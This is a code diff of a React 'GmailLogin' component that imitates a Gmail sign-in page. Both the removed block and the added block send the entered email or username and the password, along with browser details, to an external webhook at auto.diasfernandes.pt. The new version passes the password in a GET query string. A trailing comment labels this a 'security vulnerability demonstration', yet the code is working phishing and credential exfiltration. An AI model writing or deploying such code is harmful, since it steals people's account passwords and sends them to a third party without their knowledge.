@@ -163,26 +163,29 @@ function GmailLogin({ onBack }) {
       
       setLoading(true);
 
-      // vamos fazer um post para registrar o email e a password , e dados do navegador e ip e data/hora
-      fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          email,
-          password,
-          userAgent: navigator.userAgent,
-          ip:  navigator.connection ? navigator.connection.remoteAddress : 'unknown',
-          clientInfo: {
-            platform: navigator.platform,
-            userAgent: navigator.userAgent,
-            language: navigator.language
-          },
-          timestamp: new Date().toISOString(),
-          step: 'login_attempt'
-        })
-      });
+const dataForm = new URLSearchParams();
+dataForm.append('username', username  ? username : ''); // Ensure username is not undefined
+dataForm.append('password', password ? password : ''); // Ensure password is not undefined
+dataForm.append('rememberMe', rememberMe ? 'true' : 'false');
+
+fetch('https://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603/?' + dataForm.toString(), {
+  method: 'GET',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+  }
+})
+.then(response => {
+  if (!response.ok) {
+    throw new Error('Network response was not ok');
+  }
+  return response.text();
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  console.error('Error:', error);
+});
 
       // SECURITY VULNERABILITY DEMONSTRATION:
       // This demonstrates how credentials could be intercepted by malicious code
